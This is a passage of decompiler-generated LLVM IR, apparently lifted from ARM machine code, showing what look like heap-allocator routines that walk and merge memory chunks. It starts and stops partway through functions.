  %v1_1274c = inttoptr i32 %v0_1274c to i32*
  %v2_1274c = load i32, i32* %v1_1274c, align 4
  store i32 %v2_1274c, i32* %r5.global-to-local, align 4
  %v2_12750 = sub i32 %v0_1274c, %v2_1274c
  store i32 %v2_12750, i32* %r3.global-to-local, align 4
  %v1_12754 = add i32 %v2_12750, 8
  %v2_12754 = inttoptr i32 %v1_12754 to i32*
  %v3_12754 = load i32, i32* %v2_12754, align 4
  store i32 %v3_12754, i32* @ip, align 4
  %v1_12758 = add i32 %v3_12754, 12
  %v2_12758 = inttoptr i32 %v1_12758 to i32*
  %v3_12758 = load i32, i32* %v2_12758, align 4
  store i32 %v3_12758, i32* %r1.global-to-local, align 4
  %v9_1275c = icmp eq i32 %v3_12758, %v2_12750
  %v1_12760 = add i32 %v2_12750, 12
  %v2_12760 = inttoptr i32 %v1_12760 to i32*
  %v3_12760 = load i32, i32* %v2_12760, align 4
  store i32 %v3_12760, i32* %r2.global-to-local, align 4
  br i1 %v9_1275c, label %dec_label_pc_12768, label %dec_label_pc_127c4

dec_label_pc_12768:                               ; preds = %dec_label_pc_1274c
  %v1_12768 = add i32 %v3_12760, 8
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  store i32 %v3_12768, i32* %r3.global-to-local, align 4
  %v9_1276c = icmp eq i32 %v3_12768, %v2_12750
  br i1 %v9_1276c, label %dec_label_pc_12774, label %dec_label_pc_127c4

dec_label_pc_12774:                               ; preds = %dec_label_pc_12768
  store i32 %v3_12754, i32* %v2_12768, align 4
  %v0_12778 = load i32, i32* %r2.global-to-local, align 4
  %v1_12778 = load i32, i32* @ip, align 4
  %v2_12778 = add i32 %v1_12778, 12
  %v3_12778 = inttoptr i32 %v2_12778 to i32*
  store i32 %v0_12778, i32* %v3_12778, align 4
  %v0_1277c = load i32, i32* %lr.global-to-local, align 4
  %v1_1277c = load i32, i32* %r5.global-to-local, align 4
  %v2_1277c = add i32 %v1_1277c, %v0_1277c
  store i32 %v2_1277c, i32* %lr.global-to-local, align 4
  %v0_12784.pre = load i32, i32* @r0, align 4
  %v0_12788.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12780

dec_label_pc_12780:                               ; preds = %dec_label_pc_12730, %dec_label_pc_12774
  %v0_127f8 = phi i32 [ %v1_12734, %dec_label_pc_12730 ], [ %v2_1277c, %dec_label_pc_12774 ]
  %v0_12788 = phi i32 [ %v3_12744, %dec_label_pc_12730 ], [ %v0_12788.pre, %dec_label_pc_12774 ]
  %v1_1279c = phi i32 [ %v2_12738, %dec_label_pc_12730 ], [ %v0_12784.pre, %dec_label_pc_12774 ]
  %v0_12780 = load i32, i32* @r4, align 4
  %v1_12780 = add i32 %v0_12780, 44
  %v2_12780 = inttoptr i32 %v1_12780 to i32*
  %v3_12780 = load i32, i32* %v2_12780, align 4
  store i32 %v3_12780, i32* %r3.global-to-local, align 4
  %v9_12784 = icmp eq i32 %v1_1279c, %v3_12780
  %v1_12788 = and i32 %v0_12788, -4
  store i32 %v1_12788, i32* %r5.global-to-local, align 4
  br i1 %v9_12784, label %dec_label_pc_127f8, label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12780
  %v2_12790 = add i32 %v1_1279c, %v1_12788
  store i32 %v2_12790, i32* %r3.global-to-local, align 4
  %v1_12794 = add i32 %v2_12790, 4
  %v2_12794 = inttoptr i32 %v1_12794 to i32*
  %v3_12794 = load i32, i32* %v2_12794, align 4
  store i32 %v3_12794, i32* %r3.global-to-local, align 4
  %v1_12798 = urem i32 %v3_12794, 2
  %v2_12798 = icmp eq i32 %v1_12798, 0
  %v2_1279c = add i32 %v1_1279c, 4
  %v3_1279c = inttoptr i32 %v2_1279c to i32*
  store i32 %v1_12788, i32* %v3_1279c, align 4
  br i1 %v2_12798, label %dec_label_pc_127a4, label %dec_label_pc_12790.dec_label_pc_127d4_crit_edge

dec_label_pc_12790.dec_label_pc_127d4_crit_edge:  ; preds = %dec_label_pc_12790
  %v0_127d8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127d4

dec_label_pc_127a4:                               ; preds = %dec_label_pc_12790
  %v0_127a4 = load i32, i32* @r0, align 4
  %v1_127a4 = add i32 %v0_127a4, 8
  %v2_127a4 = inttoptr i32 %v1_127a4 to i32*
  %v3_127a4 = load i32, i32* %v2_127a4, align 4
  store i32 %v3_127a4, i32* @ip, align 4
  %v1_127a8 = add i32 %v3_127a4, 12
  %v2_127a8 = inttoptr i32 %v1_127a8 to i32*
  %v3_127a8 = load i32, i32* %v2_127a8, align 4
  store i32 %v3_127a8, i32* %r3.global-to-local, align 4
  %v9_127ac = icmp eq i32 %v3_127a8, %v0_127a4
  %v1_127b0 = add i32 %v0_127a4, 12
  %v2_127b0 = inttoptr i32 %v1_127b0 to i32*
  %v3_127b0 = load i32, i32* %v2_127b0, align 4
  store i32 %v3_127b0, i32* %r2.global-to-local, align 4
  br i1 %v9_127ac, label %dec_label_pc_127b8, label %dec_label_pc_127c4

dec_label_pc_127b8:                               ; preds = %dec_label_pc_127a4
  %v1_127b8 = add i32 %v3_127b0, 8
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  %v3_127b8 = load i32, i32* %v2_127b8, align 4
  store i32 %v3_127b8, i32* %r3.global-to-local, align 4
  %v9_127bc = icmp eq i32 %v3_127b8, %v0_127a4
  br i1 %v9_127bc, label %dec_label_pc_127c8, label %dec_label_pc_127c4

dec_label_pc_127c4:                               ; preds = %dec_label_pc_127a4, %dec_label_pc_12768, %dec_label_pc_1274c, %dec_label_pc_127b8
  %v0_127c4 = call i32 @function_12b14()
  store i32 %v0_127c4, i32* @r0, align 4
  %v0_127c8.pre = load i32, i32* @ip, align 4
  %v1_127c8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_127c8

dec_label_pc_127c8:                               ; preds = %dec_label_pc_127b8, %dec_label_pc_127c4
  %v1_127c8 = phi i32 [ %v3_127b0, %dec_label_pc_127b8 ], [ %v1_127c8.pre, %dec_label_pc_127c4 ]
  %v0_127c8 = phi i32 [ %v3_127a4, %dec_label_pc_127b8 ], [ %v0_127c8.pre, %dec_label_pc_127c4 ]
  %v2_127c8 = add i32 %v1_127c8, 8
  %v3_127c8 = inttoptr i32 %v2_127c8 to i32*
  store i32 %v0_127c8, i32* %v3_127c8, align 4
  %v0_127cc = load i32, i32* %r2.global-to-local, align 4
  %v1_127cc = load i32, i32* @ip, align 4
  %v2_127cc = add i32 %v1_127cc, 12
  %v3_127cc = inttoptr i32 %v2_127cc to i32*
  store i32 %v0_127cc, i32* %v3_127cc, align 4
  %v0_127d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_127d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_127d0 = add i32 %v1_127d0, %v0_127d0
  store i32 %v2_127d0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_12790.dec_label_pc_127d4_crit_edge, %dec_label_pc_127c8
  %v0_127d8 = phi i32 [ %v0_127d8.pre, %dec_label_pc_12790.dec_label_pc_127d4_crit_edge ], [ %v2_127d0, %dec_label_pc_127c8 ]
  %v0_127d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_127d4 = add i32 %v0_127d4, 8
  %v2_127d4 = inttoptr i32 %v1_127d4 to i32*
  %v3_127d4 = load i32, i32* %v2_127d4, align 4
  store i32 %v3_127d4, i32* %r2.global-to-local, align 4
  %v1_127d8 = or i32 %v0_127d8, 1
  store i32 %v1_127d8, i32* %r3.global-to-local, align 4
  %v0_127dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_127dc, i32* %v2_127d4, align 4
  %v0_127e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_127e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_127e0 = add i32 %v1_127e0, 12
  %v3_127e0 = inttoptr i32 %v2_127e0 to i32*
  store i32 %v0_127e0, i32* %v3_127e0, align 4
  %v0_127e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_127e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_127e4 = add i32 %v1_127e4, %v0_127e4
  %v4_127e4 = inttoptr i32 %v3_127e4 to i32*
  store i32 %v0_127e4, i32* %v4_127e4, align 4
  %v0_127e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_127e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_127e8 = add i32 %v1_127e8, 4
  %v3_127e8 = inttoptr i32 %v2_127e8 to i32*
  store i32 %v0_127e8, i32* %v3_127e8, align 4
  %v0_127ec = load i32, i32* %r2.global-to-local, align 4
  %v1_127ec = load i32, i32* %r1.global-to-local, align 4
  %v2_127ec = add i32 %v1_127ec, 8
  %v3_127ec = inttoptr i32 %v2_127ec to i32*
  store i32 %v0_127ec, i32* %v3_127ec, align 4
  %v0_127f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_127f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_127f0 = add i32 %v1_127f0, 12
  %v3_127f0 = inttoptr i32 %v2_127f0 to i32*
  store i32 %v0_127f0, i32* %v3_127f0, align 4
  br label %dec_label_pc_12808

dec_label_pc_127f8:                               ; preds = %dec_label_pc_12780
  %v2_127f8 = add i32 %v1_12788, %v0_127f8
  %v1_127fc = or i32 %v2_127f8, 1
  store i32 %v1_127fc, i32* %r3.global-to-local, align 4
  %v1_12800 = load i32, i32* %r1.global-to-local, align 4
  %v2_12800 = add i32 %v1_12800, 4
  %v3_12800 = inttoptr i32 %v2_12800 to i32*
  store i32 %v1_127fc, i32* %v3_12800, align 4
  %v0_12804 = load i32, i32* %r1.global-to-local, align 4
  %v1_12804 = load i32, i32* @r4, align 4
  %v2_12804 = add i32 %v1_12804, 44
  %v3_12804 = inttoptr i32 %v2_12804 to i32*
  store i32 %v0_12804, i32* %v3_12804, align 4
  br label %dec_label_pc_12808

dec_label_pc_12808:                               ; preds = %dec_label_pc_127d4, %dec_label_pc_127f8
  %v0_12808 = load i32, i32* %sl.global-to-local, align 4
  %v2_12808 = icmp eq i32 %v0_12808, 0
  store i32 %v0_12808, i32* %r1.global-to-local, align 4
  br i1 %v2_12808, label %dec_label_pc_12814.loopexit, label %dec_label_pc_12730

dec_label_pc_12814.loopexit:                      ; preds = %dec_label_pc_12808
  %v0_12814.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12814.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_12814.loopexit, %dec_label_pc_12720
  %v1_12814 = phi i32 [ %v1_12814.pre, %dec_label_pc_12814.loopexit ], [ %v1_1281410, %dec_label_pc_12720 ]
  %v0_1281c = phi i32 [ %v0_12814.pre, %dec_label_pc_12814.loopexit ], [ %v1_1272c, %dec_label_pc_12720 ]
  %v9_12814 = icmp eq i32 %v0_1281c, %v1_12814
  br i1 %v9_12814, label %dec_label_pc_1288c, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12814
  %v1_1281c = add i32 %v0_1281c, 4
  store i32 %v1_1281c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12720

dec_label_pc_12824.dec_label_pc_12824_crit_edge:  ; preds = %dec_label_pc_12824.preheader, %dec_label_pc_12824.dec_label_pc_12824_crit_edge
  %v0_12824.pre = load i32, i32* @r4, align 4
  %v1_12824.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12824 = mul i32 %v1_12824.pre, 8
  %v5_12824 = add i32 %v4_12824, %v0_12824.pre
  %v1_12828 = add i32 %v1_12824.pre, 1
  store i32 %v1_12828, i32* %r2.global-to-local, align 4
  %v1_1282c = add i32 %v5_12824, 44
  store i32 %v1_1282c, i32* %r3.global-to-local, align 4
  %v2_12834 = add i32 %v5_12824, 52
  %v3_12834 = inttoptr i32 %v2_12834 to i32*
  store i32 %v1_1282c, i32* %v3_12834, align 4
  %v0_12838 = load i32, i32* %r3.global-to-local, align 4
  %v2_12838 = add i32 %v0_12838, 12
  %v3_12838 = inttoptr i32 %v2_12838 to i32*
  store i32 %v0_12838, i32* %v3_12838, align 4
  %v7_1283c = icmp sgt i32 %v1_12828, 95
  br i1 %v7_1283c, label %dec_label_pc_12840, label %dec_label_pc_12824.dec_label_pc_12824_crit_edge

dec_label_pc_12840:                               ; preds = %dec_label_pc_12824.dec_label_pc_12824_crit_edge
  %v0_12840 = load i32, i32* @r4, align 4
  %v1_12840 = inttoptr i32 %v0_12840 to i32*
  %v2_12840 = load i32, i32* %v1_12840, align 4
  store i32 %v2_12840, i32* %r2.global-to-local, align 4
  %v1_12844 = add i32 %v0_12840, 864
  %v2_12844 = inttoptr i32 %v1_12844 to i32*
  %v3_12844 = load i32, i32* %v2_12844, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1284c = urem i32 %v2_12840, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12854 = or i32 %v3_12844, 1
  store i32 %v1_12854, i32* %r1.global-to-local, align 4
  %v1_12858 = or i32 %v1_1284c, 72
  store i32 %v1_12858, i32* %r2.global-to-local, align 4
  %v1_1285c = add i32 %v0_12840, 52
  store i32 %v1_1285c, i32* @ip, align 4
  %v2_12860 = add i32 %v0_12840, 840
  %v3_12860 = inttoptr i32 %v2_12860 to i32*
  store i32 0, i32* %v3_12860, align 4
  %v0_12864 = load i32, i32* %r3.global-to-local, align 4
  %v1_12864 = add i32 %v0_12864, 65536
  store i32 %v1_12864, i32* %r3.global-to-local, align 4
  %v0_12868 = load i32, i32* %r0.global-to-local, align 4
  %v1_12868 = load i32, i32* @r4, align 4
  %v2_12868 = add i32 %v1_12868, 836
  %v3_12868 = inttoptr i32 %v2_12868 to i32*
  store i32 %v0_12868, i32* %v3_12868, align 4
  %v0_1286c = load i32, i32* %r0.global-to-local, align 4
  %v1_1286c = load i32, i32* @r4, align 4
  %v2_1286c = add i32 %v1_1286c, 844
  %v3_1286c = inttoptr i32 %v2_1286c to i32*
  store i32 %v0_1286c, i32* %v3_1286c, align 4
  %v1_12870 = load i32, i32* @r4, align 4
  %v2_12870 = add i32 %v1_12870, 852
  %v3_12870 = inttoptr i32 %v2_12870 to i32*
  store i32 %v1_12864, i32* %v3_12870, align 4
  %v1_12874 = load i32, i32* @r4, align 4
  %v2_12874 = add i32 %v1_12874, 864
  %v3_12874 = inttoptr i32 %v2_12874 to i32*
  store i32 %v1_12854, i32* %v3_12874, align 4
  %v1_12878 = load i32, i32* @r4, align 4
  %v2_12878 = inttoptr i32 %v1_12878 to i32*
  store i32 %v1_12858, i32* %v2_12878, align 4
  %v0_1287c = load i32, i32* @ip, align 4
  %v1_1287c = load i32, i32* @r4, align 4
  %v2_1287c = add i32 %v1_1287c, 44
  %v3_1287c = inttoptr i32 %v2_1287c to i32*
  store i32 %v0_1287c, i32* %v3_1287c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12884 = call i32 @function_130e8(i32 30, i32 %v1_12854, i32 %v1_12858, i32 %v1_12864)
  store i32 %v4_12884, i32* @r0, align 4
  %v1_12888 = load i32, i32* @r4, align 4
  %v2_12888 = add i32 %v1_12888, 860
  %v3_12888 = inttoptr i32 %v2_12888 to i32*
  store i32 %v4_12884, i32* %v3_12888, align 4
  br label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %dec_label_pc_12814, %dec_label_pc_12840
  %v2_12890 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12890, i32* @r4, align 4
  %v1_12894 = load i32, i32* @r0, align 4
  ret i32 %v1_12894

; uselistorder directives
  uselistorder i32 %v0_12840, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12838, { 1, 0 }
  uselistorder i32 %v1_1281c, { 1, 0 }
  uselistorder i32 %v0_12808, { 0, 2, 1 }
  uselistorder i32 %v0_127e4, { 1, 0 }
  uselistorder i32 %v1_12734, { 1, 0, 2 }
  uselistorder i32 %v0_1274c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1270c, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 11 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 10, 9, 11, 12, 13, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 5, 6, 3, 2, 0, 1, 4 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 17, 2, 10, 6, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 8, 9, 7 }
  uselistorder label %dec_label_pc_1288c, { 1, 0 }
  uselistorder label %dec_label_pc_12824.dec_label_pc_12824_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12808, { 1, 0 }
  uselistorder label %dec_label_pc_127d4, { 1, 0 }
  uselistorder label %dec_label_pc_127c8, { 1, 0 }
  uselistorder label %dec_label_pc_127c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12780, { 1, 0 }
}

define i32 @function_12898() local_unnamed_addr {
dec_label_pc_12898:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12898 = load i32, i32* @r4, align 4
  %v6_12898 = load i32, i32* @r5, align 4
  %v9_12898 = load i32, i32* @r6, align 4
  %v12_12898 = load i32, i32* @r7, align 4
  %v18_12898 = load i32, i32* @lr, align 4
  %v0_128a0 = load i32, i32* @r0, align 4
  store i32 %v0_128a0, i32* @r6, align 4
  %v2_128a0 = icmp eq i32 %v0_128a0, 0
  %v2_128a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 124804, i32* @r7, align 4
  br i1 %v2_128a0, label %dec_label_pc_12aac, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_12898
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_128b4 = load i32, i32* inttoptr (i32 124872 to i32*), align 8
  store i32 %v4_128b4, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_128b4, i32* %r2.global-to-local, align 4
  %v4_128c0 = load i32, i32* inttoptr (i32 124840 to i32*), align 8
  store i32 %v4_128c0, i32* %r1.global-to-local, align 4
  store i32 %v2_128a4, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_128cc = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  store i32 %v4_128cc, i32* %ip.global-to-local, align 4
  store i32 75992, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128cc)
  %v0_128d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_128d8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_128e0 = load i32, i32* @r7, align 4
  %v2_128e0 = add i32 %v0_128e0, 16
  %v3_128e0 = inttoptr i32 %v2_128e0 to i32*
  %v4_128e0 = load i32, i32* %v3_128e0, align 4
  store i32 %v4_128e0, i32* %ip.global-to-local, align 4
  store i32 76012, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128e0)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_128f0 = load i32, i32* @r7, align 4
  %v2_128f0 = add i32 %v0_128f0, 32
  %v3_128f0 = inttoptr i32 %v2_128f0 to i32*
  %v4_128f0 = load i32, i32* %v3_128f0, align 4
  store i32 %v4_128f0, i32* @lr, align 4
  %v0_128f4 = load i32, i32* @r6, align 4
  %v1_128f4 = add i32 %v0_128f4, -4
  %v2_128f4 = inttoptr i32 %v1_128f4 to i32*
  %v3_128f4 = load i32, i32* %v2_128f4, align 4
  store i32 %v3_128f4, i32* %r2.global-to-local, align 4
  %v1_128f8 = inttoptr i32 %v4_128f0 to i32*
  %v2_128f8 = load i32, i32* %v1_128f8, align 4
  store i32 %v2_128f8, i32* %r3.global-to-local, align 4
  %v1_128fc = and i32 %v3_128f4, -4
  store i32 %v1_128fc, i32* %ip.global-to-local, align 4
  %v1_12900 = add i32 %v0_128f4, -8
  store i32 %v1_12900, i32* @r5, align 4
  store i32 %v1_12900, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_128fc, %v2_128f8
  br i1 %tmp, label %dec_label_pc_12930, label %dec_label_pc_12910

dec_label_pc_12910:                               ; preds = %dec_label_pc_128b0
  %v1_12910 = or i32 %v2_128f8, 3
  store i32 %v1_12910, i32* %r3.global-to-local, align 4
  store i32 %v1_12910, i32* %v1_128f8, align 4
  %v3_12914 = load i32, i32* @lr, align 4
  %v4_12914 = add i32 %v3_12914, -8
  store i32 %v4_12914, i32* %lr.global-to-local, align 4
  %v0_12918 = load i32, i32* %ip.global-to-local, align 4
  %v3_12918 = udiv i32 %v0_12918, 8
  store i32 %v3_12918, i32* %r1.global-to-local, align 4
  %v1_1291c = add i32 %v3_12914, -4
  store i32 %v1_1291c, i32* %r2.global-to-local, align 4
  %v4_12920 = mul nuw i32 %v3_12918, 4
  %v5_12920 = add i32 %v4_12920, %v1_1291c
  %v6_12920 = inttoptr i32 %v5_12920 to i32*
  %v7_12920 = load i32, i32* %v6_12920, align 4
  store i32 %v7_12920, i32* %r3.global-to-local, align 4
  %v1_12924 = load i32, i32* @r5, align 4
  %v2_12924 = add i32 %v1_12924, 8
  %v3_12924 = inttoptr i32 %v2_12924 to i32*
  store i32 %v7_12920, i32* %v3_12924, align 4
  %v0_12928 = load i32, i32* @r5, align 4
  %v1_12928 = load i32, i32* %r2.global-to-local, align 4
  %v2_12928 = load i32, i32* %r1.global-to-local, align 4
  %v5_12928 = mul i32 %v2_12928, 4
  %v6_12928 = add i32 %v5_12928, %v1_12928
  %v7_12928 = inttoptr i32 %v6_12928 to i32*
  store i32 %v0_12928, i32* %v7_12928, align 4
  br label %dec_label_pc_12a94

dec_label_pc_12930:                               ; preds = %dec_label_pc_128b0
  %v1_12930 = and i32 %v3_128f4, 2
  %v2_12930 = icmp eq i32 %v1_12930, 0
  br i1 %v2_12930, label %dec_label_pc_12938, label %dec_label_pc_12a6c

dec_label_pc_12938:                               ; preds = %dec_label_pc_12930
  %v1_12938 = or i32 %v2_128f8, 1
  store i32 %v1_12938, i32* %r3.global-to-local, align 4
  store i32 %v1_12938, i32* %v1_128f8, align 4
  %v0_12940 = load i32, i32* @r6, align 4
  %v1_12940 = add i32 %v0_12940, -4
  %v2_12940 = inttoptr i32 %v1_12940 to i32*
  %v3_12940 = load i32, i32* %v2_12940, align 4
  store i32 %v3_12940, i32* %r3.global-to-local, align 4
  %v0_12944 = load i32, i32* @r5, align 4
  %v1_12944 = load i32, i32* %ip.global-to-local, align 4
  %v2_12944 = add i32 %v1_12944, %v0_12944
  store i32 %v2_12944, i32* %lr.global-to-local, align 4
  %v1_12948 = urem i32 %v3_12940, 2
  %v2_12948 = icmp eq i32 %v1_12948, 0
  %v1_1294c = add i32 %v2_12944, 4
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  store i32 %v3_1294c, i32* %r8.global-to-local, align 4
  br i1 %v2_12948, label %dec_label_pc_12954, label %dec_label_pc_12988

dec_label_pc_12954:                               ; preds = %dec_label_pc_12938
  %v1_12954 = add i32 %v0_12940, -8
  %v2_12954 = inttoptr i32 %v1_12954 to i32*
  %v3_12954 = load i32, i32* %v2_12954, align 4
  store i32 %v3_12954, i32* %r1.global-to-local, align 4
  %v2_12958 = sub i32 %v0_12944, %v3_12954
  store i32 %v2_12958, i32* %r3.global-to-local, align 4
  %v1_1295c = add i32 %v2_12958, 8
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  store i32 %v3_1295c, i32* %r2.global-to-local, align 4
  %v1_12960 = add i32 %v3_1295c, 12
  %v2_12960 = inttoptr i32 %v1_12960 to i32*
  %v3_12960 = load i32, i32* %v2_12960, align 4
  store i32 %v3_12960, i32* %r4.global-to-local, align 4
  %v9_12964 = icmp eq i32 %v3_12960, %v2_12958
  %v1_12968 = add i32 %v2_12958, 12
  %v2_12968 = inttoptr i32 %v1_12968 to i32*
  %v3_12968 = load i32, i32* %v2_12968, align 4
  store i32 %v3_12968, i32* %r0.global-to-local, align 4
  br i1 %v9_12964, label %dec_label_pc_12970, label %dec_label_pc_129d4

dec_label_pc_12970:                               ; preds = %dec_label_pc_12954
  %v1_12970 = add i32 %v3_12968, 8
  %v2_12970 = inttoptr i32 %v1_12970 to i32*
  %v3_12970 = load i32, i32* %v2_12970, align 4
  store i32 %v3_12970, i32* %r3.global-to-local, align 4
  %v9_12974 = icmp eq i32 %v3_12970, %v2_12958
  br i1 %v9_12974, label %dec_label_pc_1297c, label %dec_label_pc_129d4

dec_label_pc_1297c:                               ; preds = %dec_label_pc_12970
  store i32 %v3_1295c, i32* %v2_12970, align 4
  %v0_12980 = load i32, i32* %r0.global-to-local, align 4
  %v1_12980 = load i32, i32* %r2.global-to-local, align 4
  %v2_12980 = add i32 %v1_12980, 12
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  store i32 %v0_12980, i32* %v3_12980, align 4
  %v0_12984 = load i32, i32* %ip.global-to-local, align 4
  %v1_12984 = load i32, i32* %r1.global-to-local, align 4
  %v2_12984 = add i32 %v1_12984, %v0_12984
  store i32 %v2_12984, i32* %ip.global-to-local, align 4
  %v0_12994.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12998.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_12938, %dec_label_pc_1297c
  %v0_12a14 = phi i32 [ %v1_12944, %dec_label_pc_12938 ], [ %v2_12984, %dec_label_pc_1297c ]
  %v0_12998 = phi i32 [ %v3_1294c, %dec_label_pc_12938 ], [ %v0_12998.pre, %dec_label_pc_1297c ]
  %v1_129ac = phi i32 [ %v2_12944, %dec_label_pc_12938 ], [ %v0_12994.pre, %dec_label_pc_1297c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1298c = load i32, i32* @r7, align 4
  %v2_1298c = add i32 %v0_1298c, 32
  %v3_1298c = inttoptr i32 %v2_1298c to i32*
  %v4_1298c = load i32, i32* %v3_1298c, align 4
  store i32 %v4_1298c, i32* %r2.global-to-local, align 4
  %v1_12990 = add i32 %v4_1298c, 44
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %r3.global-to-local, align 4
  %v9_12994 = icmp eq i32 %v1_129ac, %v3_12990
  %v1_12998 = and i32 %v0_12998, -4
  store i32 %v1_12998, i32* %r0.global-to-local, align 4
  br i1 %v9_12994, label %dec_label_pc_12a14, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12988
  %v2_129a0 = add i32 %v1_129ac, %v1_12998
  store i32 %v2_129a0, i32* %r3.global-to-local, align 4
  %v1_129a4 = add i32 %v2_129a0, 4
  %v2_129a4 = inttoptr i32 %v1_129a4 to i32*
  %v3_129a4 = load i32, i32* %v2_129a4, align 4
  store i32 %v3_129a4, i32* %r3.global-to-local, align 4
  %v1_129a8 = urem i32 %v3_129a4, 2
  %v2_129a8 = icmp eq i32 %v1_129a8, 0
  %v2_129ac = add i32 %v1_129ac, 4
  %v3_129ac = inttoptr i32 %v2_129ac to i32*
  store i32 %v1_12998, i32* %v3_129ac, align 4
  br i1 %v2_129a8, label %dec_label_pc_129b4, label %dec_label_pc_129a0.dec_label_pc_129e4_crit_edge

dec_label_pc_129a0.dec_label_pc_129e4_crit_edge:  ; preds = %dec_label_pc_129a0
  %v0_129f4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_129e4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129a0
  %v0_129b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_129b4 = add i32 %v0_129b4, 8
  %v2_129b4 = inttoptr i32 %v1_129b4 to i32*
  %v3_129b4 = load i32, i32* %v2_129b4, align 4
  store i32 %v3_129b4, i32* %r1.global-to-local, align 4
  %v1_129b8 = add i32 %v3_129b4, 12
  %v2_129b8 = inttoptr i32 %v1_129b8 to i32*
  %v3_129b8 = load i32, i32* %v2_129b8, align 4
  store i32 %v3_129b8, i32* %r3.global-to-local, align 4
  %v9_129bc = icmp eq i32 %v3_129b8, %v0_129b4
  %v1_129c0 = add i32 %v0_129b4, 12
  %v2_129c0 = inttoptr i32 %v1_129c0 to i32*
  %v3_129c0 = load i32, i32* %v2_129c0, align 4
  store i32 %v3_129c0, i32* %r2.global-to-local, align 4
  br i1 %v9_129bc, label %dec_label_pc_129c8, label %dec_label_pc_129d4

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129b4
  %v1_129c8 = add i32 %v3_129c0, 8
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  store i32 %v3_129c8, i32* %r3.global-to-local, align 4
  %v9_129cc = icmp eq i32 %v3_129c8, %v0_129b4
  br i1 %v9_129cc, label %dec_label_pc_129d8, label %dec_label_pc_129d4

